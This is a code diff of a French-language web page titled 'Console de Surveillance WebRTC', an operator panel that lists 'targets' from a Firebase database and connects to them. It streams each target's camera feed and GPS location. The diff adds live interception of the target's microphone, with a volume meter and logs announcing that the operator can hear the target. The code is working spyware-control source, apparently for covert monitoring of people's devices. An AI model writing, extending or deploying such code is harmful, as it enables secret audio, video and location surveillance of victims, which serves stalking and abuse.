@@ -12,7 +12,25 @@
             0%, 100% { opacity: 1; }
             50% { opacity: 0.4; }
         }
+        @keyframes pulse-green {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(0.95); }
+        }
         .live-pulse { animation: pulse-red 1s infinite; }
+        .mic-active { animation: pulse-green 0.8s infinite; }
+        .volume-meter {
+            width: 50px;
+            height: 4px;
+            background: #1f2937;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .volume-level {
+            height: 100%;
+            background: #10b981;
+            width: 0%;
+            transition: width 0.1s ease;
+        }
     </style>
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-8">
@@ -24,7 +42,7 @@
                 <h1 class="text-2xl md:text-3xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent flex items-center gap-2">
                     <span>🎥</span> Console de Surveillance WebRTC
                 </h1>
-                <p class="text-slate-400 text-sm mt-1">Interception directe et fluide du flux vidéo de la cible</p>
+                <p class="text-slate-400 text-sm mt-1">Interception directe du flux vidéo ET audio de la cible</p>
             </div>
             <div id="connectionStatus" class="px-4 py-2 bg-slate-950 border border-slate-800 rounded-2xl text-xs font-semibold text-slate-400 flex items-center gap-2">
                 <span class="w-2.5 h-2.5 rounded-full bg-slate-600" id="statusDot"></span>
@@ -53,7 +71,7 @@
                 </div>
 
                 <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl flex flex-col h-64">
-                    <h3 class="text-sm font-semibold text-slate-400 mb-3 uppercase tracking-wider">💾 Logs de Connexion WebRTC</h3>
+                    <h3 class="text-sm font-semibold text-slate-400 mb-3 uppercase tracking-wider">💾 Logs de Connexion</h3>
                     <div id="connectionLog" class="flex-1 bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] font-mono text-cyan-400 overflow-y-auto space-y-1"></div>
                 </div>
             </div>
@@ -61,35 +79,38 @@
             <div class="lg:col-span-2 space-y-4">
                 <div class="bg-slate-900 border border-slate-800 rounded-3xl p-4 shadow-xl flex flex-col">
                     <div class="flex items-center justify-between mb-3 px-2">
-                        <span class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📺 Flux Caméra Temps Réel</span>
+                        <span class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📺 Flux Caméra + Micro Temps Réel</span>
                         <div class="flex items-center gap-3 text-xs text-slate-500">
                             <span id="metaState">Inactif</span>
+                            <div class="volume-meter" id="volumeMeter" style="display: none;">
+                                <div class="volume-level" id="volumeLevel"></div>
+                            </div>
                         </div>
                     </div>
 
                     <div class="relative bg-slate-950 aspect-video rounded-2xl overflow-hidden border border-slate-850 flex items-center justify-center min-h-[350px]">
                         <div id="placeholderText" class="absolute flex flex-col items-center justify-center text-slate-600 p-6 text-center">
                             <span class="text-5xl mb-3">📡</span>
-                            <p class="text-sm font-medium">Sélectionnez un appareil en ligne à gauche, puis cliquez sur "Se connecter".</p>
+                            <p class="text-sm font-medium">Sélectionnez une cible, puis cliquez sur "Se connecter"</p>
                         </div>
                         <video id="remoteVideo" autoplay playsinline class="hidden w-full h-full object-contain"></video>
-                        <div id="audioStatusBadge" class="hidden absolute top-3 right-3 bg-emerald-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full items-center gap-1.5 shadow-lg z-20">
+                        <div id="audioStatusBadge" class="hidden absolute top-3 right-3 bg-emerald-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full items-center gap-1.5 shadow-lg z-20 mic-active">
                             <span class="w-1.5 h-1.5 rounded-full bg-white animate-pulse"></span>
-                            🔊 MICROPHONE ACTIF
+                            🔊 MICRO ACTIF - SON DISPONIBLE
                         </div>
                     </div>
 
                     <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
-                        <button id="connectBtn" class="py-3 px-4 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
+                        <button id="connectBtn" class="py-3 px-4 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none">
                             🔗 Se connecter
                         </button>
-                        <button id="toggleAudioBtn" disabled class="py-3 px-4 bg-emerald-800 hover:bg-emerald-700 text-emerald-100 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
+                        <button id="toggleAudioBtn" disabled class="py-3 px-4 bg-emerald-800 hover:bg-emerald-700 text-emerald-100 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none">
                             🔊 Activer Audio
                         </button>
-                        <button id="disconnectBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-red-900 hover:text-white text-slate-400 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
+                        <button id="disconnectBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-red-900 hover:text-white text-slate-400 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none">
                             ⏹️ Arrêter
                         </button>
-                        <button id="fullscreenBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
+                        <button id="fullscreenBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none">
                             🖥️ Plein écran
                         </button>
                     </div>
@@ -109,8 +130,7 @@
             projectId: "universite-taak",
             storageBucket: "universite-taak.firebasestorage.app",
             messagingSenderId: "550634728649",
-            appId: "1:550634728649:web:12147e8dec3a04618c3118",
-            measurementId: "G-RD7KY6BFP4"
+            appId: "1:550634728649:web:12147e8dec3a04618c3118"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -121,6 +141,9 @@
         let locationListenerRef = null;
         let candidatesListenerRef = null;
         let candidateQueue = [];
+        let audioContext = null;
+        let sourceNode = null;
+        let volumeInterval = null;
 
         const remoteVideo = document.getElementById('remoteVideo');
         const placeholderText = document.getElementById('placeholderText');
@@ -132,10 +155,11 @@
         const userInfoDiv = document.getElementById('userInfo');
         const gpsDataDiv = document.getElementById('gpsData');
         const connectionLog = document.getElementById('connectionLog');
-
         const statusDot = document.getElementById('statusDot');
         const statusText = document.getElementById('statusText');
         const metaState = document.getElementById('metaState');
+        const volumeMeter = document.getElementById('volumeMeter');
+        const volumeLevel = document.getElementById('volumeLevel');
 
         const rtcConfig = {
             iceServers: [
@@ -153,7 +177,6 @@
         function setSystemStatus(message, state = 'idle') {
             statusText.innerText = message;
             statusDot.className = "w-2.5 h-2.5 rounded-full";
-            
             if (state === 'live') {
                 statusDot.classList.add('bg-red-500', 'live-pulse');
             } else if (state === 'pending') {
@@ -163,10 +186,8 @@
             }
         }
 
-        // Fonction corrigée pour charger les cibles depuis webrtc et users
         function loadUsers() {
             const webrtcRef = ref(database, 'webrtc');
-            
             onValue(webrtcRef, (snapshot) => {
                 const webrtcData = snapshot.val();
                 const previousSelection = userSelect.value;
@@ -183,17 +204,9 @@
                         const isRecent = (now - timestamp) < 30000;
                         
                         if (hasOffer && isRecent) {
-                            activeLive.push({ 
-                                id: userId, 
-                                device: "📱 Cible", 
-                                timestamp: timestamp 
-                            });
+                            activeLive.push({ id: userId, timestamp: timestamp });
                         } else if (hasOffer) {
-                            activeIdle.push({ 
-                                id: userId, 
-                                device: "📱 Cible", 
-                                timestamp: timestamp 
-                            });
+                            activeIdle.push({ id: userId, timestamp: timestamp });
                         }
                     });
                 }
@@ -201,16 +214,16 @@
                 let selectHTML = '<option value="">-- Choisir une cible --</option>';
                 
                 if (activeLive.length > 0) {
-                    selectHTML += `<optgroup label="🟢 EN DIRECT (FLUX DISPONIBLE)">`;
+                    selectHTML += `<optgroup label="🟢 EN DIRECT (AUDIO+VIDEO)">`;
                     activeLive.forEach(user => {
                         const isSelected = (user.id === previousSelection) ? 'selected' : '';
-                        selectHTML += `<option value="${user.id}" ${isSelected}>🟢 [LIVE] Cible #${user.id}</option>`;
+                        selectHTML += `<option value="${user.id}" ${isSelected}>🟢 [LIVE] Cible #${user.id} 🎤🎥</option>`;
                     });
                     selectHTML += `</optgroup>`;
                 }
                 
                 if (activeIdle.length > 0) {
-                    selectHTML += `<optgroup label="🟡 EN ATTENTE (OFFRE TROUVÉE)">`;
+                    selectHTML += `<optgroup label="🟡 EN ATTENTE">`;
                     activeIdle.forEach(user => {
                         const isSelected = (user.id === previousSelection) ? 'selected' : '';
                         selectHTML += `<option value="${user.id}" ${isSelected}>🟡 [ATTENTE] Cible #${user.id}</option>`;
@@ -220,45 +233,24 @@
                 
                 if (activeLive.length === 0 && activeIdle.length === 0) {
                     selectHTML = '<option value="">-- Aucune cible détectée --</option>';
-                    addLog("📡 Aucune offre WebRTC trouvée dans la base de données");
-                } else {
-                    addLog(`✅ ${activeLive.length + activeIdle.length} cible(s) détectée(s) (${activeLive.length} active(s))`);
                 }
                 
                 userSelect.innerHTML = selectHTML;
-            }, (error) => {
-                console.error("Erreur lecture webrtc:", error);
-                addLog(`❌ Erreur Firebase: ${error.message}`);
-                userSelect.innerHTML = '<option value="">-- Erreur de chargement --</option>';
             });
         }
 
         function loadUserInfo(userId) {
             if (locationListenerRef) off(locationListenerRef);
-
             locationListenerRef = ref(database, `users/${userId}/location`);
             onValue(locationListenerRef, (snapshot) => {
                 const location = snapshot.val();
                 if (location) {
                     userInfoDiv.style.display = 'block';
                     gpsDataDiv.innerHTML = `
-                        <div class="space-y-1">
-                            <span class="text-xs text-slate-500 block">Latitude</span>
-                            <span class="font-mono text-slate-200 font-bold">${location.lat}</span>
-                        </div>
-                        <div class="space-y-1">
-                            <span class="text-xs text-slate-500 block">Longitude</span>
-                            <span class="font-mono text-slate-200 font-bold">${location.lng}</span>
-                        </div>
-                        <div class="pt-2">
-                            <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" 
-                               target="_blank" class="w-full inline-block text-center py-2 px-4 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 font-semibold rounded-xl text-xs transition-all">
-                                🗺️ Ouvrir dans Google Maps
-                            </a>
-                        </div>
-                        <div class="text-[10px] text-slate-500 text-right pt-1">
-                            Mis à jour : ${new Date(location.timestamp).toLocaleTimeString()}
-                        </div>
+                        <div><span class="text-xs text-slate-500">Latitude</span><br><span class="font-mono text-slate-200">${location.lat}</span></div>
+                        <div><span class="text-xs text-slate-500">Longitude</span><br><span class="font-mono text-slate-200">${location.lng}</span></div>
+                        <div><a href="https://www.google.com/maps?q=${location.lat},${location.lng}" target="_blank" class="block text-center py-2 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 rounded-xl text-xs">🗺️ Ouvrir dans Maps</a></div>
+                        <div class="text-right text-[10px] text-slate-500">${new Date(location.timestamp).toLocaleTimeString()}</div>
                     `;
                 } else {
                     userInfoDiv.style.display = 'none';
@@ -266,22 +258,47 @@
             });
         }
 
+        function setupVolumeMeter(stream) {
+            if (audioContext) {
+                audioContext.close();
+            }
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            sourceNode = audioContext.createMediaStreamSource(stream);
+            const analyser = audioContext.createAnalyser();
+            analyser.fftSize = 256;
+            sourceNode.connect(analyser);
+            
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+            volumeMeter.style.display = 'block';
+            
+            if (volumeInterval) clearInterval(volumeInterval);
+            volumeInterval = setInterval(() => {
+                analyser.getByteFrequencyData(dataArray);
+                let average = 0;
+                for (let i = 0; i < dataArray.length; i++) {
+                    average += dataArray[i];
+                }
+                average = average / dataArray.length;
+                const percent = Math.min(100, (average / 255) * 100);
+                volumeLevel.style.width = percent + '%';
+            }, 50);
+            
+            audioContext.resume();
+        }
+
         async function connectToUser() {
             currentUserId = userSelect.value;
             if (!currentUserId) {
-                setSystemStatus("⚠️ Choisissez une cible", "pending");
-                addLog("⚠️ Erreur : aucun utilisateur sélectionné.");
+                addLog("⚠️ Aucune cible sélectionnée");
                 return;
             }
 
             disconnect();
-            currentUserId = userSelect.value;
-            
             setSystemStatus("🔄 Connexion...", "pending");
             connectBtn.disabled = true;
             disconnectBtn.disabled = false;
             
-            addLog(`🔍 Demande du flux WebRTC pour la cible #${currentUserId}...`);
+            addLog(`🔍 Connexion à la cible #${currentUserId}...`);
 
             try {
                 const offerRef = ref(database, `webrtc/${currentUserId}/offer`);
@@ -289,7 +306,7 @@
                 const offer = offerSnapshot.val();
 
                 if (!offer) {
-                    addLog("❌ Impossible de se connecter : Aucune offre WebRTC disponible.");
+                    addLog("❌ Aucune offre WebRTC disponible");
                     setSystemStatus("❌ Aucun signal", "idle");
                     connectBtn.disabled = false;
                     disconnectBtn.disabled = true;
@@ -301,7 +318,7 @@
 
                 peerConnection.onconnectionstatechange = () => {
                     metaState.innerText = peerConnection.connectionState.toUpperCase();
-                    addLog(`Statut de liaison : ${peerConnection.connectionState}`);
+                    addLog(`État: ${peerConnection.connectionState}`);
                     if (peerConnection.connectionState === 'connected') {
                         setSystemStatus("🔴 EN DIRECT", "live");
                         fullscreenBtn.disabled = false;
@@ -309,53 +326,57 @@
                 };
 
                 peerConnection.ontrack = (event) => {
-                    addLog(`🎬 Flux reçu : ${event.track.kind}`);
-                    placeholderText.style.display = 'none';
-                    remoteVideo.style.display = 'block';
-                    remoteVideo.srcObject = event.streams[0];
+                    addLog(`📡 Track reçue: ${event.track.kind}`);
                     
-                    remoteVideo.muted = true;
-                    toggleAudioBtn.disabled = false;
-                    toggleAudioBtn.innerText = "🔊 Activer Audio";
-
+                    if (event.track.kind === 'video') {
+                        placeholderText.style.display = 'none';
+                        remoteVideo.style.display = 'block';
+                    }
+                    
+                    if (remoteVideo.srcObject) {
+                        const stream = remoteVideo.srcObject;
+                        stream.addTrack(event.track);
+                    } else {
+                        remoteVideo.srcObject = event.streams[0];
+                    }
+                    
                     if (event.track.kind === 'audio') {
-                        document.getElementById('audioStatusBadge').style.display = 'flex';
-                        addLog("🔊 Microphone de la cible détecté.");
+                        const badge = document.getElementById('audioStatusBadge');
+                        badge.style.display = 'flex';
+                        addLog("🔊 MICROPHONE ACTIF - Son disponible !");
+                        toggleAudioBtn.disabled = false;
+                        setupVolumeMeter(event.streams[0]);
                     }
                 };
 
                 peerConnection.onicecandidate = (event) => {
                     if (event.candidate) {
-                        const candidateRef = ref(database, `webrtc/${currentUserId}/admin-candidates`);
-                        push(candidateRef, event.candidate.toJSON());
+                        push(ref(database, `webrtc/${currentUserId}/admin-candidates`), event.candidate.toJSON());
                     }
                 };
 
                 await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-                addLog("📝 Offre de la cible appliquée.");
+                addLog("✅ Offre reçue");
 
                 while (candidateQueue.length > 0) {
-                    const candidate = candidateQueue.shift();
-                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidateQueue.shift())).catch(e => console.warn(e));
                 }
 
                 const answer = await peerConnection.createAnswer();
                 await peerConnection.setLocalDescription(answer);
-
-                const answerRef = ref(database, `webrtc/${currentUserId}/answer`);
-                await set(answerRef, {
+                await set(ref(database, `webrtc/${currentUserId}/answer`), {
                     sdp: answer.sdp,
                     type: answer.type,
                     timestamp: Date.now()
                 });
-                addLog("📤 Réponse envoyée.");
+                addLog("📤 Réponse envoyée");
 
                 const userCandidatesRef = ref(database, `webrtc/${currentUserId}/candidates`);
                 candidatesListenerRef = onValue(userCandidatesRef, (snapshot) => {
                     const candidates = snapshot.val();
                     if (candidates) {
                         Object.values(candidates).forEach(candidate => {
-                            if (peerConnection && peerConnection.currentRemoteDescription) {
+                            if (peerConnection?.currentRemoteDescription) {
                                 peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
                             } else {
                                 candidateQueue.push(candidate);
@@ -367,27 +388,18 @@
                 loadUserInfo(currentUserId);
 
             } catch (err) {
-                addLog(`❌ Échec : ${err.message}`);
+                addLog(`❌ Erreur: ${err.message}`);
                 setSystemStatus("❌ Échec", "idle");
                 disconnect();
             }
         }
 
         function disconnect() {
-            if (candidatesListenerRef) {
-                off(ref(database, `webrtc/${currentUserId}/candidates`));
-                candidatesListenerRef = null;
-            }
-            if (locationListenerRef) {
-                off(locationListenerRef);
-                locationListenerRef = null;
-            }
-            
-            if (peerConnection) {
-                peerConnection.close();
-                peerConnection = null;
-            }
-
+            if (volumeInterval) clearInterval(volumeInterval);
+            if (audioContext) audioContext.close();
+            if (candidatesListenerRef) off(ref(database, `webrtc/${currentUserId}/candidates`));
+            if (locationListenerRef) off(locationListenerRef);
+            if (peerConnection) peerConnection.close();
             if (currentUserId) {
                 remove(ref(database, `webrtc/${currentUserId}/answer`));
                 remove(ref(database, `webrtc/${currentUserId}/admin-candidates`));
@@ -398,16 +410,22 @@
             document.getElementById('audioStatusBadge').style.display = 'none';
             placeholderText.style.display = 'flex';
             userInfoDiv.style.display = 'none';
+            volumeMeter.style.display = 'none';
+            volumeLevel.style.width = '0%';
             
             connectBtn.disabled = false;
             toggleAudioBtn.disabled = true;
             toggleAudioBtn.innerText = "🔊 Activer Audio";
+            toggleAudioBtn.classList.remove('bg-red-800');
+            toggleAudioBtn.classList.add('bg-emerald-800');
             disconnectBtn.disabled = true;
             fullscreenBtn.disabled = true;
-            
             metaState.innerText = "INACTIF";
             setSystemStatus("🔌 Déconnecté", "idle");
             addLog("🔌 Déconnecté");
+            
+            peerConnection = null;
+            currentUserId = null;
         }
 
         function toggleAudio() {
@@ -415,20 +433,18 @@
                 remoteVideo.muted = false;
                 toggleAudioBtn.innerText = "🔇 Couper Audio";
                 toggleAudioBtn.classList.replace('bg-emerald-800', 'bg-red-800');
-                addLog("🔊 Audio activé.");
+                addLog("🔊 Audio activé - Vous entendez le micro de la cible");
             } else {
                 remoteVideo.muted = true;
                 toggleAudioBtn.innerText = "🔊 Activer Audio";
                 toggleAudioBtn.classList.replace('bg-red-800', 'bg-emerald-800');
-                addLog("🔇 Audio coupé.");
+                addLog("🔇 Audio coupé");
             }
         }
 
         function toggleFullscreen() {
             if (!document.fullscreenElement) {
-                remoteVideo.requestFullscreen().catch(err => {
-                    console.error("Erreur plein écran:", err);
-                });
+                remoteVideo.requestFullscreen();
             } else {
                 document.exitFullscreen();
             }
@@ -441,6 +457,7 @@
         userSelect.addEventListener('change', disconnect);
         
         loadUsers();
+        setInterval(loadUsers, 5000);
     </script>
 </body>
 </html>
